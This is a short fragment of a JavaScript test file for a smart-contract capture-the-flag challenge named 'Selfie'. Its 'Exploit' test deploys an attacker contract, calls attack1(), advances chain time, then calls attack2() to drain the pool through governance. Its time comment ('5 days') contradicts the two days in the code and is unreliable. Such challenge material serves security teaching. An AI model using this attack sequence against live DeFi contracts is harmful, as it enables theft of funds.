...
describe('[Challenge] Selfie', function () {
    ...
    it('Exploit', async function () {
        ...
        const AttackerContract = await ethers.getContractFactory('SelfieAttacker', attacker);
        const attackerContract = await AttackerContract.deploy(this.pool.address, this.governance.address);

        await attackerContract.connect(attacker).attack1();

        await ethers.provider.send("evm_increaseTime", [2 * 24 * 60 * 60]); // 5 days
        await ethers.provider.send("evm_mine", []);

        await attackerContract.connect(attacker).attack2();
    });
